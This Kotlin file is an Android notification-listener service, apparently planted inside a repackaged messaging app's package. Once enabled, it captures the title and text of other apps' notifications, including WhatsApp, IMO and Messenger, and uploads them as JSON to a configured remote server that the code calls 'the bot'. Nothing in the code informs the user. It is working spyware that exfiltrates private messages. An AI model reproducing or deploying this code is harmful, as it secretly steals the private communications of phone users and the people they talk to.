package org.fossify.messages.androbox

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.*

class NotificationCaptureService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private var isForwardingEnabled = false
        private var currentOrigin: String = "user"  // 🆕

        fun setForwardingEnabled(enabled: Boolean, origin: String = "user") {
            isForwardingEnabled = enabled
            currentOrigin = origin
            Log.d("NotifCapture", "Forwarding enabled: $enabled, origin=$origin")
        }

        fun isForwardingEnabled(): Boolean = isForwardingEnabled
    }

    private val ignorePackages = listOf(
        "com.android.systemui",
        "com.android.phone",
        "android",
        packageName
    )

    private val ignoreKeywords = listOf(
        "checking for new messages",
        "updating",
        "synchronizing",
        "backup completed",
        "no new messages",
        "you have no new messages",
        "new messages"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (!isForwardingEnabled) return
        sbn ?: return
        val packageName = sbn.packageName
        if (ignorePackages.contains(packageName)) return

        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE, "")
        val text = extras.getString(Notification.EXTRA_TEXT, "")

        val combined = "$title $text".lowercase()
        if (ignoreKeywords.any { combined.contains(it) }) {
            Log.d("NotifCapture", "Ignored (keyword): $combined")
            return
        }
        if (text.length < 5 && title.length < 5) return
        if (text.isBlank() && (title == "WhatsApp" || title == "IMO" || title == "Messenger")) return

        Log.d("NotifCapture", "Captured: $packageName | $title | $text")
        forwardToBot(packageName, title, text)
    }

    private fun forwardToBot(packageName: String, title: String, messageBody: String) {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls == null) {
            Log.e("NotifCapture", "No server config")
            return
        }
        val (host, _) = urls

        val appName = try {
            val pm = applicationContext.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
        } catch (e: Exception) {
            packageName
        }

        val jsonData = """
            {
                "app": "$appName",
                "title": "$title",
                "message": "$messageBody",
                "timestamp": ${System.currentTimeMillis()}
            }
        """.trimIndent()

        serviceScope.launch {
            val success = FileUploader.uploadNotification(applicationContext, jsonData, host, currentOrigin)
            if (success) Log.d("NotifCapture", "Forwarded to bot (origin=$currentOrigin)")
            else Log.e("NotifCapture", "Forward failed")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}